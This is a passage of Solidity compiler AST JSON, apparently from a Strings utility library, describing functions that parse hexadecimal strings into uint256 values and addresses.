`uint256`."},"id":1114,"implemented":true,"kind":"function","modifiers":[],"name":"tryParseHexUint","nameLocation":"12150:15:3","nodeType":"FunctionDefinition","parameters":{"id":1085,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1080,"mutability":"mutable","name":"input","nameLocation":"12189:5:3","nodeType":"VariableDeclaration","scope":1114,"src":"12175:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1079,"name":"string","nodeType":"ElementaryTypeName","src":"12175:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":1082,"mutability":"mutable","name":"begin","nameLocation":"12212:5:3","nodeType":"VariableDeclaration","scope":1114,"src":"12204:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1081,"name":"uint256","nodeType":"ElementaryTypeName","src":"12204:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1084,"mutability":"mutable","name":"end","nameLocation":"12235:3:3","nodeType":"VariableDeclaration","scope":1114,"src":"12227:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1083,"name":"uint256","nodeType":"ElementaryTypeName","src":"12227:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12165:79:3"},"returnParameters":{"id":1090,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1087,"mutability":"mutable","name":"success","nameLocation":"12273:7:3","nodeType":"VariableDeclaration","scope":1114,"src":"12268:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1086,"name":"bool","nodeType":"ElementaryTypeName","src":"12268:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1089,"mutability":"mutable","name":"value","nameLocation":"12290:5:3","nodeType":"VariableDeclaration","scope":1114,"src":"12282:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1088,"name":"uint256","nodeType":"ElementaryTypeName","src":"12282:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12267:29:3"},"scope":1631,"src":"12141:303:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1216,"nodeType":"Block","src":"12853:881:3","statements":[{"assignments":[1129],"declarations":[{"constant":false,"id":1129,"mutability":"mutable","name":"buffer","nameLocation":"12876:6:3","nodeType":"VariableDeclaration","scope":1216,"src":"12863:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1128,"name":"bytes","nodeType":"ElementaryTypeName","src":"12863:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":1134,"initialValue":{"arguments":[{"id":1132,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1117,"src":"12891:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1131,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"12885:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1130,"name":"bytes","nodeType":"ElementaryTypeName","src":"12885:5:3","typeDescriptions":{}}},"id":1133,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12885:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"VariableDeclarationStatement","src":"12863:34:3"},{"assignments":[1136],"declarations":[{"constant":false,"id":1136,"mutability":"mutable","name":"hasPrefix","nameLocation":"12950:9:3","nodeType":"VariableDeclaration","scope":1216,"src":"12945:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1135,"name":"bool","nodeType":"ElementaryTypeName","src":"12945:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"id":1156,"initialValue":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1155,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1141,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1137,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1121,"src":"12963:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1140,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1138,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1119,"src":"12969:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":1139,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12977:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"12969:9:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"12963:15:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"id":1142,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"12962:17:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_bytes2","typeString":"bytes2"},"id":1154,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"arguments":[{"id":1146,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1129,"src":"13013:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1147,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1119,"src":"13021:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1145,"name":"_unsafeReadBytesOffset","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1630,"src":"12990:22:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$_t_uint256_$returns$_t_bytes32_$","typeString":"function (bytes memory,uint256) pure returns (bytes32)"}},"id":1148,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12990:37:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1144,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"12983:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes2_$","typeString":"type(bytes2)"},"typeName":{"id":1143,"name":"bytes2","nodeType":"ElementaryTypeName","src":"12983:6:3","typeDescriptions":{}}},"id":1149,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12983:45:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes2","typeString":"bytes2"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"3078","id":1152,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"13039:4:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_39bef1777deb3dfb14f64b9f81ced092c501fee72f90e93d03bb95ee89df9837","typeString":"literal_string \"0x\""},"value":"0x"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_39bef1777deb3dfb14f64b9f81ced092c501fee72f90e93d03bb95ee89df9837","typeString":"literal_string \"0x\""}],"id":1151,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"13032:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes2_$","typeString":"type(bytes2)"},"typeName":{"id":1150,"name":"bytes2","nodeType":"ElementaryTypeName","src":"13032:6:3","typeDescriptions":{}}},"id":1153,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13032:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes2","typeString":"bytes2"}},"src":"12983:61:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"12962:82:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"VariableDeclarationStatement","src":"12945:99:3"},{"assignments":[1158],"declarations":[{"constant":false,"id":1158,"mutability":"mutable","name":"offset","nameLocation":"13133:6:3","nodeType":"VariableDeclaration","scope":1216,"src":"13125:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1157,"name":"uint256","nodeType":"ElementaryTypeName","src":"13125:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1164,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1163,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":1159,"name":"hasPrefix","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1136,"src":"13142:9:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1160,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"13152:6:3","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"13142:16:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$attached_to$_t_bool_$","typeString":"function (bool) pure returns (uint256)"}},"id":1161,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13142:18:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"hexValue":"32","id":1162,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13163:1:3","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"13142:22:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"13125:39:3"},{"assignments":[1166],"declarations":[{"constant":false,"id":1166,"mutability":"mutable","name":"result","nameLocation":"13183:6:3","nodeType":"VariableDeclaration","scope":1216,"src":"13175:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1165,"name":"uint256","nodeType":"ElementaryTypeName","src":"13175:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1168,"initialValue":{"hexValue":"30","id":1167,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13192:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"13175:18:3"},{"body":{"id":1210,"nodeType":"Block","src":"13250:447:3","statements":[{"assignments":[1182],"declarations":[{"constant":false,"id":1182,"mutability":"mutable","name":"chr","nameLocation":"13270:3:3","nodeType":"VariableDeclaration","scope":1210,"src":"13264:9:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":1181,"name":"uint8","nodeType":"ElementaryTypeName","src":"13264:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"id":1192,"initialValue":{"arguments":[{"arguments":[{"arguments":[{"id":1187,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1129,"src":"13319:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1188,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1170,"src":"13327:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1186,"name":"_unsafeReadBytesOffset","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1630,"src":"13296:22:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$_t_uint256_$returns$_t_bytes32_$","typeString":"function (bytes memory,uint256) pure returns (bytes32)"}},"id":1189,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13296:33:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1185,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"13289:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes1_$","typeString":"type(bytes1)"},"typeName":{"id":1184,"name":"bytes1","nodeType":"ElementaryTypeName","src":"13289:6:3","typeDescriptions":{}}},"id":1190,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13289:41:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes1","typeString":"bytes1"}],"id":1183,"name":"_tryParseChr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1452,"src":"13276:12:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes1_$returns$_t_uint8_$","typeString":"function (bytes1) pure returns (uint8)"}},"id":1191,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13276:55:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"VariableDeclarationStatement","src":"13264:67:3"},{"condition":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":1195,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1193,"name":"chr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1182,"src":"13349:3:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"3135","id":1194,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13355:2:3","typeDescriptions":{"typeIdentifier":"t_rational_15_by_1","typeString":"int_const 15"},"value":"15"},"src":"13349:8:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1200,"nodeType":"IfStatement","src":"13345:31:3","trueBody":{"expression":{"components":[{"hexValue":"66616c7365","id":1196,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"13367:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"hexValue":"30","id":1197,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13374:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"id":1198,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"13366:10:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_rational_0_by_1_$","typeString":"tuple(bool,int_const 0)"}},"functionReturnParameters":1127,"id":1199,"nodeType":"Return","src":"13359:17:3"}},{"expression":{"id":1203,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1201,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1166,"src":"13390:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"hexValue":"3136","id":1202,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13400:2:3","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},"src":"13390:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1204,"nodeType":"ExpressionStatement","src":"13390:12:3"},{"id":1209,"nodeType":"UncheckedBlock","src":"13416:271:3","statements":[{"expression":{"id":1207,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1205,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1166,"src":"13659:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"id":1206,"name":"chr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1182,"src":"13669:3:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"13659:13:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1208,"nodeType":"ExpressionStatement","src":"13659:13:3"}]}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1177,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1175,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1170,"src":"13236:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":1176,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1121,"src":"13240:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"13236:7:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1211,"initializationExpression":{"assignments":[1170],"declarations":[{"constant":false,"id":1170,"mutability":"mutable","name":"i","nameLocation":"13216:1:3","nodeType":"VariableDeclaration","scope":1211,"src":"13208:9:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1169,"name":"uint256","nodeType":"ElementaryTypeName","src":"13208:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1174,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1173,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1171,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1119,"src":"13220:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"id":1172,"name":"offset","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1158,"src":"13228:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"13220:14:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"13208:26:3"},"isSimpleCounterLoop":true,"loopExpression":{"expression":{"id":1179,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":true,"src":"13245:3:3","subExpression":{"id":1178,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1170,"src":"13247:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1180,"nodeType":"ExpressionStatement","src":"13245:3:3"},"nodeType":"ForStatement","src":"13203:494:3"},{"expression":{"components":[{"hexValue":"74727565","id":1212,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"13714:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},{"id":1213,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1166,"src":"13720:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1214,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"13713:14:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"functionReturnParameters":1127,"id":1215,"nodeType":"Return","src":"13706:21:3"}]},"documentation":{"id":1115,"nodeType":"StructuredDocumentation","src":"12450:227:3","text":" @dev Implementation of {tryParseHexUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\n `begin <= end <= input.length`. Other inputs would result in undefined behavior."},"id":1217,"implemented":true,"kind":"function","modifiers":[],"name":"_tryParseHexUintUncheckedBounds","nameLocation":"12691:31:3","nodeType":"FunctionDefinition","parameters":{"id":1122,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1117,"mutability":"mutable","name":"input","nameLocation":"12746:5:3","nodeType":"VariableDeclaration","scope":1217,"src":"12732:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1116,"name":"string","nodeType":"ElementaryTypeName","src":"12732:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":1119,"mutability":"mutable","name":"begin","nameLocation":"12769:5:3","nodeType":"VariableDeclaration","scope":1217,"src":"12761:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1118,"name":"uint256","nodeType":"ElementaryTypeName","src":"12761:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1121,"mutability":"mutable","name":"end","nameLocation":"12792:3:3","nodeType":"VariableDeclaration","scope":1217,"src":"12784:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1120,"name":"uint256","nodeType":"ElementaryTypeName","src":"12784:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12722:79:3"},"returnParameters":{"id":1127,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1124,"mutability":"mutable","name":"success","nameLocation":"12829:7:3","nodeType":"VariableDeclaration","scope":1217,"src":"12824:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1123,"name":"bool","nodeType":"ElementaryTypeName","src":"12824:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1126,"mutability":"mutable","name":"value","nameLocation":"12846:5:3","nodeType":"VariableDeclaration","scope":1217,"src":"12838:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1125,"name":"uint256","nodeType":"ElementaryTypeName","src":"12838:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12823:29:3"},"scope":1631,"src":"12682:1052:3","stateMutability":"pure","virtual":false,"visibility":"private"},{"body":{"id":1235,"nodeType":"Block","src":"14032:67:3","statements":[{"expression":{"arguments":[{"id":1226,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1220,"src":"14062:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"hexValue":"30","id":1227,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"14069:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"expression":{"arguments":[{"id":1230,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1220,"src":"14078:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1229,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14072:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1228,"name":"bytes","nodeType":"ElementaryTypeName","src":"14072:5:3","typeDescriptions":{}}},"id":1231,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14072:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1232,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"14085:6:3","memberName":"length","nodeType":"MemberAccess","src":"14072:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1225,"name":"parseAddress","nodeType":"Identifier","overloadedDeclarations":[1236,1267],"referencedDeclaration":1267,"src":"14049:12:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_address_$","typeString":"function (string memory,uint256,uint256) pure returns (address)"}},"id":1233,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14049:43:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":1224,"id":1234,"nodeType":"Return","src":"14042:50:3"}]},"documentation":{"id":1218,"nodeType":"StructuredDocumentation","src":"13740:212:3","text":" @dev Parse a hexadecimal string (with or without \"0x\" prefix), and returns the value as an `address`.\n Requirements:\n - The string must be formatted as `(0x)?[0-9a-fA-F]{40}`"},"id":1236,"implemented":true,"kind":"function","modifiers":[],"name":"parseAddress","nameLocation":"13966:12:3","nodeType":"FunctionDefinition","parameters":{"id":1221,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1220,"mutability":"mutable","name":"input","nameLocation":"13993:5:3","nodeType":"VariableDeclaration","scope":1236,"src":"13979:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1219,"name":"string","nodeType":"ElementaryTypeName","src":"13979:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"13978:21:3"},"returnParameters":{"id":1224,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1223,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1236,"src":"14023:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1222,"name":"address","nodeType":"ElementaryTypeName","src":"14023:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"14022:9:3"},"scope":1631,"src":"13957:142:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1266,"nodeType":"Block","src":"14472:165:3","statements":[{"assignments":[1249,1251],"declarations":[{"constant":false,"id":1249,"mutability":"mutable","name":"success","nameLocation":"14488:7:3","nodeType":"VariableDeclaration","scope":1266,"src":"14483:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1248,"name":"bool","nodeType":"ElementaryTypeName","src":"14483:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"